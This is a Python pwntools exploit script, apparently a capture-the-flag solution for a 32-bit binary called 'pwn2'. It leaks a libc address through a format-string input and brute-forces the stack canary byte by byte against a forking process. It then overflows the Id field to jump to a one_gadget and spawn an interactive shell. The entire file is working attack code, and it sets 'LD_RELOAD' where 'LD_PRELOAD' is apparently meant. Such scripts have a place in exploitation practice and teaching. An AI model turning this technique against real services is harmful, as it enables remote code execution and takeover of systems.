#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'
p = process('./pwn2', env={'LD_RELOAD':'./libc.so.6_x86'})
elf = ELF('./pwn2')
libc = ELF('./libc.so.6_x86')
system_offset = libc.symbols['system']
str_bin_sh_offset = next(libc.search('/bin/sh'))
log.success('system_offset = ' + hex(system_offset))
log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))
libc_offset = 0x1b2000
log.success('libc_offset = ' + hex(libc_offset))
one_gadget_offset = 0x3af1c
log.success('one_gadget_offset = ' + hex(one_gadget_offset))
# gdb.attach(p)

def forkNew():
	p.sendlineafter('[Y]', 'Y')

def inputName(name):
	p.recvuntil('[*] Input Your name please:')
	p.send(name)

def inputId(Id):
	p.recvuntil('[*] Input Your Id:')
	p.send(Id)

canary = '\x00'
for i in range(3):
	for j in range(256):
		# log.info('try ' + hex(j))
		if i != 0 and j == 0:
			p.sendline('Y')
		else:
			forkNew()
		inputName('%12$p\n')
		p.recvuntil('[*] Welcome to the game ')
		leak_addr = int(p.recv(10), 16)
		payload = 'A' * 16
		payload += canary
		payload += chr(j)
		inputId(payload)
		p.recv()
		if 'smashing' not in  p.recv():
			canary += chr(j)
			log.info('At round %d find canary byte %#x' %(i, j))
			break
log.success('canary = ' + hex(u32(canary)))
log.success('leak_addr = ' + hex(leak_addr))
libc_base = leak_addr - libc_offset
log.success('libc_base = ' + hex(libc_base))
system = libc_base + system_offset
str_bin_sh = libc_base + str_bin_sh_offset
one_gadget = libc_base + one_gadget_offset
log.success('system = ' + hex(system))
log.success('str_bin_sh = ' + hex(str_bin_sh))
log.success('one_gadget = ' + hex(one_gadget))
p.sendline('Y')
inputName('AssassinQ\n')
payload = flat([
	'A' * 16, 
	canary, 
	'B' * 12, 
	one_gadget
])
inputId(payload)
p.interactive()
